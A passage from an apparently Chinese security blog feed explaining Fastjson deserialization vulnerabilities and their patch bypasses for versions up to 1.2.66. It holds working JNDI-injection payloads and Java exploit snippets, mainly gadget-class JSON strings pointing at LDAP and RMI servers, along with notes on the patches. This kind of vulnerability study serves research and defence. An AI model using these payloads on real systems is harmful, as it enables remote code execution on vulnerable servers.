&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228878364-323bb8f0-1dad-42c4-aaa1-c550ddfde7a4.png&#34;
	width=&#34;692&#34;
	height=&#34;356&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228878364-323bb8f0-1dad-42c4-aaa1-c550ddfde7a4_huf06c11f9a53f66d27451670d5d2aa7c9_164200_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228878364-323bb8f0-1dad-42c4-aaa1-c550ddfde7a4_huf06c11f9a53f66d27451670d5d2aa7c9_164200_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;194&#34;
		data-flex-basis=&#34;466px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;data_source&lt;/code&gt;可控&lt;/p&gt;
&lt;h3 id=&#34;1225-1247补丁绕过&#34;&gt;1.2.25-1.2.47补丁绕过
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;本次Fastjson反序列化漏洞也是基于&lt;/font&gt;&lt;code&gt;checkAutoType()&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;函数绕过的，并且&lt;/font&gt;&lt;strong&gt;无需开启AutoTypeSupport&lt;/strong&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;，大大提高了成功利用的概率。&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;绕过的大体思路是通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，&lt;/font&gt;&lt;code&gt;checkAutoType()&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;就会抛出异常终止程序。&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;Demo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本：&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;EXP 如下&lt;/font&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String payload  = &amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    + &amp;#34;\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    + &amp;#34;\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;ldap://localhost:1389/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;JSON.parse(payload);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229146299-1945713b-d1b4-40ce-904d-8cc25eda32ad.png&#34;
	width=&#34;1051&#34;
	height=&#34;710&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229146299-1945713b-d1b4-40ce-904d-8cc25eda32ad_hue936def518b79333354604827b7e0950_67460_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229146299-1945713b-d1b4-40ce-904d-8cc25eda32ad_hue936def518b79333354604827b7e0950_67460_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;148&#34;
		data-flex-basis=&#34;355px&#34;
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;补丁分析&#34;&gt;补丁分析
&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，看看是怎样修的。1.2.48中的修复措施是，在&lt;/font&gt;&lt;code&gt;loadClass()&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229203041-30692b93-6fc7-4544-8fb9-7e7dd512fee7.png&#34;
	width=&#34;980&#34;
	height=&#34;309&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229203041-30692b93-6fc7-4544-8fb9-7e7dd512fee7_hu33bbf7a4d50e3f6ea68b585cf01581cc_54714_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229203041-30692b93-6fc7-4544-8fb9-7e7dd512fee7_hu33bbf7a4d50e3f6ea68b585cf01581cc_54714_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;317&#34;
		data-flex-basis=&#34;761px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;fastjson--1261-通杀&#34;&gt;Fastjson &amp;lt;= 1.2.61 通杀
&lt;/h2&gt;&lt;h3 id=&#34;fastjson125--1259&#34;&gt;Fastjson1.2.5 &amp;lt;= 1.2.59
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;需要开启AutoType&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;com.zaxxer.hikari.HikariConfig&amp;#34;,&amp;#34;metricRegistry&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;com.zaxxer.hikari.HikariConfig&amp;#34;,&amp;#34;healthCheckRegistry&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;fastjson125--1260&#34;&gt;Fastjson1.2.5 &amp;lt;= 1.2.60
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;需要开启 autoType：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;oracle.jdbc.connector.OracleManagedConnectionFactory&amp;#34;,&amp;#34;xaDataSourceName&amp;#34;:&amp;#34;rmi://10.10.20.166:1099/ExportObject&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.commons.configuration.JNDIConfiguration&amp;#34;,&amp;#34;prefix&amp;#34;:&amp;#34;ldap://10.10.20.166:1389/ExportObject&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;fastjson125--1261&#34;&gt;Fastjson1.2.5 &amp;lt;= 1.2.61
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&amp;#34;,&amp;#34;jndiName&amp;#34;:&amp;#34;ldap://localhost:1389/Exploi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>Fastjson1.2.62-1.2.68版本反序列化漏洞</title>
        <link>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/</link>
        <pubDate>Wed, 08 Jan 2025 14:49:47 +0800</pubDate>
        
        <guid>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/</guid>
        <description>&lt;img src="https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/25.jpg" alt="Featured image of post Fastjson1.2.62-1.2.68版本反序列化漏洞" /&gt;&lt;h2 id=&#34;1262-反序列化漏洞&#34;&gt;1.2.62 反序列化漏洞
&lt;/h2&gt;&lt;h3 id=&#34;前提条件&#34;&gt;前提条件
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;需要开启AutoType；&lt;/li&gt;
&lt;li&gt;Fastjson &amp;lt;= 1.2.62；&lt;/li&gt;
&lt;li&gt;JNDI注入利用所受的JDK版本限制；&lt;/li&gt;
&lt;li&gt;目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限，我这里把 pom.xml 贴出来。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependencies&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependency&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/artifactId&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;version&amp;gt;1.2.62&amp;lt;/version&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependency&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependency&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;groupId&amp;gt;org.apache.xbean&amp;lt;/groupId&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;artifactId&amp;gt;xbean-reflect&amp;lt;/artifactId&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;version&amp;gt;4.18&amp;lt;/version&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependency&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependency&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;groupId&amp;gt;commons-collections&amp;lt;/groupId&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;artifactId&amp;gt;commons-collections&amp;lt;/artifactId&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;version&amp;gt;3.2.1&amp;lt;/version&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependencies&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;JndiConverter&lt;/code&gt;类有个&lt;code&gt;toObjectImpl&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733232812610-a68bffd8-796d-45f1-947b-598ee372c99a.png&#34;
	width=&#34;635&#34;
	height=&#34;360&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733232812610-a68bffd8-796d-45f1-947b-598ee372c99a_hu589c15250b15841076328ce9e9b67f42_39639_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733232812610-a68bffd8-796d-45f1-947b-598ee372c99a_hu589c15250b15841076328ce9e9b67f42_39639_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;176&#34;
		data-flex-basis=&#34;423px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;存在JNDI注入漏洞&lt;/p&gt;
&lt;p&gt;但是这个类没有构造方法,无法通过fastjson反序列化触发&lt;/p&gt;
&lt;p&gt;但是这个继承了一个抽象类&lt;code&gt;AbstractConverter&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;AbstractConverter&lt;/code&gt;里的&lt;code&gt;setAsText&lt;/code&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733232941109-0f338d0b-7b55-403a-b615-40d8949d81f4.png&#34;
	width=&#34;654&#34;
	height=&#34;458&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733232941109-0f338d0b-7b55-403a-b615-40d8949d81f4_hu62f928deff024c4cfb452a37c7f97b86_47477_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733232941109-0f338d0b-7b55-403a-b615-40d8949d81f4_hu62f928deff024c4cfb452a37c7f97b86_47477_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;142&#34;
		data-flex-basis=&#34;342px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后会调用其子类&lt;code&gt;JndiConverter&lt;/code&gt;重写的&lt;code&gt;toObjectImpl&lt;/code&gt;方法,从而触发JNDI注入&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;org.apache.xbean.propertyeditor.JndiConverter\&amp;#34;,&amp;#34;+&amp;#34;\&amp;#34;AsText\&amp;#34;:\&amp;#34;ldap://127.0.0.1:8085/SZbYoVCf\&amp;#34;}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;JSON.parse(payload);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733233148338-43293624-4e9c-43ff-9ccb-60fcc27f9d8b.png&#34;
	width=&#34;1134&#34;
	height=&#34;684&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733233148338-43293624-4e9c-43ff-9ccb-60fcc27f9d8b_hu7fd261a4d23992f37c441c9951714588_66177_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733233148338-43293624-4e9c-43ff-9ccb-60fcc27f9d8b_hu7fd261a4d23992f37c441c9951714588_66177_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;165&#34;
		data-flex-basis=&#34;397px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;剩下的反序列化绕过&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1266-反序列化漏洞&#34;&gt;1.2.66 反序列化漏洞
&lt;/h2&gt;&lt;h3 id=&#34;前提条件-1&#34;&gt;前提条件
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;开启AutoType；&lt;/li&gt;
&lt;li&gt;Fastjson &amp;lt;= 1.2.66；&lt;/li&gt;
&lt;li&gt;JNDI注入利用所受的JDK版本限制；&lt;/li&gt;
&lt;li&gt;org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；&lt;/li&gt;
&lt;li&gt;br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；&lt;/li&gt;
&lt;li&gt;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;新Gadget绕过黑名单限制。&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.shiro.realm.jndi.JndiRealmFactory&amp;#34;, &amp;#34;jndiNames&amp;#34;:[&amp;#34;ldap://localhost:1389/Exploit&amp;#34;], &amp;#34;Realms&amp;#34;:[&amp;#34;&amp;#34;]}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;br.com.anteros.dbcp.AnterosDBCPConfig类PoC：&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;br.com.anteros.dbcp.AnterosDBCPConfig&amp;#34;,&amp;#34;metricRegistry&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;}或{&amp;#34;@type&amp;#34;:&amp;#34;br.com.anteros.dbcp.AnterosDBCPConfig&amp;#34;,&amp;#34;healthCheckRegistry&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
